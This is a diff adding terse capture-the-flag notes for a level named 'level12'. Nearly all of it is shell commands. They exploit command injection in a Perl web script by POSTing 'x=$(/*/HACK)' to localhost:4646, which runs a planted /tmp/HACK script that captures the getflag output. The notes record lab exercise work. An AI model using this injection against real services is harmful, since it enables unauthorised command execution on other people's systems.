@@ -1,0 +1,16 @@
+⬇️ cat level12.pl
+👉 egrep "^$xx" /tmp/xd 2>&1
+
+⬇️ egrep "$(pwd > /tmp/out)" /tmp/xd
+⬇️ cat /tmp/out
+
+⬇️ echo "echo \$(getflag) > /tmp/flag" > /tmp/HACK
+⬇️ chmod +x /tmp/HACK
+⬇️ echo "$(/*/HACK)"
+⬇️ cat /tmp/flag
+
+🔻 Hack
+⬇️ echo "echo \$(getflag) > /tmp/flag" > /tmp/HACK
+⬇️ chmod +x /tmp/HACK
+⬇️ curl -X POST -d 'x=$(/*/HACK)' localhost:4646
+👉 cat /tmp/flag
